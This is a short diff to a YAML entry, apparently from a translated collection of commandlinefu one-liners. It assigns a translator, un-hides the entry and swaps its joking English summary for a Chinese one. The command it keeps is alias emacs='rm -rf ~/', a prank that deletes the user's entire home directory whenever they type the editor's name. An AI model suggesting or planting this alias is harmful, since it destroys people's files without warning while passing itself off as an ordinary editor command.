@@ -1,8 +1,7 @@
 commandlinefu_id: 158
 translator:
-  weibo: ''
-hide: true
+  weibo: tgic
 command: |-
   alias emacs='rm -rf ~/'
 summary: |-
-  Punish people for trying to use inferior software
+  罪与罚
